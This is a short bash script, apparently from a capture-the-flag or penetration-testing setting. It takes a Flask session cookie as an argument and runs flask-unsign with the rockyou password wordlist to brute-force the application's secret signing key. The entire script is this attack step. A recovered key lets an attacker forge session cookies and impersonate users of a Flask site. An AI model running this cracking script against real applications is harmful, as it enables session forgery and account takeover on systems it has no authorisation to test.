#!/bin/bash

if [ -z "$1" ]
then
    echo "Pass a token"
    exit
fi
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie "$1" --no-literal-eval